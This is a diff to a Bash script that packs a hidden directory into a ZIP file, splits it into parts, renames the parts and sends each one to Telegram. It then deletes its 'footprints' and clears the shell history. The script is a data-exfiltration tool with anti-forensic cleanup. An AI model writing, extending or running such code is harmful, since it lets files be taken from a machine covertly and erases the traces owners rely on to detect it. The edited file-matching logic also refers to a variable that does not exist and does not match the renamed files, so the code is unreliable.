@@ -62,12 +62,22 @@ verify_zip_integrity() {
     return 0
 }
 
+# Function to rename split files
+rename_split_files() {
+    local output_prefix="$1"
+    local part_number=1
+    for part in "$output_prefix"*; do
+        mv "$part" "${output_prefix}_part_$(printf "%02d" "$part_number").zip"
+        part_number=$((part_number + 1))
+    done
+}
+
 # Function to delete footprints
 delete_footprints() {
     # Delete the hidden directory and its contents
     rm -rf "$HIDDEN_DIRECTORY"
     # Delete the temporary ZIP file and its parts
-    rm -f "$HIDDEN_DIRECTORY.zip" "$HIDDEN_DIRECTORY.zip.part_"*
+    rm -f "$HIDDEN_DIRECTORY.zip" "$HIDDEN_DIRECTORY_part_"*
     # Clear Bash command history
     history -c
 }
@@ -103,11 +113,15 @@ main() {
 
     # Split the ZIP file into smaller chunks
     echo "Splitting ZIP file..."
-    split_file "$HIDDEN_DIRECTORY.zip" "$HIDDEN_DIRECTORY.zip.part_"
+    split_file "$HIDDEN_DIRECTORY.zip" "$HIDDEN_DIRECTORY.part_"
+
+    # Rename split files to include part numbers
+    echo "Renaming split files..."
+    rename_split_files "$HIDDEN_DIRECTORY.part_"
 
     # Send each chunk to Telegram
     echo "Sending ZIP file parts to Telegram..."
-    for part in "$HIDDEN_DIRECTORY.zip.part_"*; do
+    for part in "$HIDDEN_DIRECTORY_part_"*; do
         send_file_to_telegram "$part"
     done
 
